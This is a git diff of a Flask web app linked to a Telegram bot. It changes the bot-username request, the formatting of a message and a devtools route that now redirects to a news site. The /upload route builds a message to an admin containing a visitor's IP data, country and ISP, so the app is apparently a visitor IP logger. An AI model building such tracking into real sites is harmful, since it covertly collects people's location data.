@@ -1,19 +1,19 @@
 import os
-from flask import Flask, request, render_template,jsonify
+from flask import Flask, request, render_template,jsonify,redirect
 import requests
 import uuid
 app = Flask(__name__)
 from config import BOT_TOKEN, ADMIN_ID
-
 def get_bot_username():
     """Get the bot's username from the Telegram API."""
-    response = requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/getMe')
+    response = requests.get(f'https://api.telegram.org/bot{BOT_TOKEN}/getMe')
     if response.status_code == 200: 
         data = response.json()
         if data['ok']:
-            return (data['result']['username'])
-    return None
-
+                return (data['result']['username'])
+    else:
+        return None
+    
 @app.route('/')
 def index():
     BOT_USERNAME= get_bot_username()
@@ -107,7 +107,7 @@ def upload():
         f"   - <b>Davlat:</b> <code>{country}</code>\n"
         f"   - <b>ISP:</b> <code>{isp}</code>\n\n"
         "\n\n"
-        f"<code> ''json {user_ip_data} ''</code>\n\n"
+        f"<code> ''{user_ip_data} ''</code>\n\n"
     )
 
 
@@ -136,7 +136,7 @@ def upload():
 
 @app.route('/.well-known/appspecific/com.chrome.devtools.json')
 def chrome_devtools_fix():
-    return '', 204  # 204 No Content
+    return redirect(location='https://kun.uz/',code=302)
 
 if __name__ == '__main__':
     app.run(debug=False, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
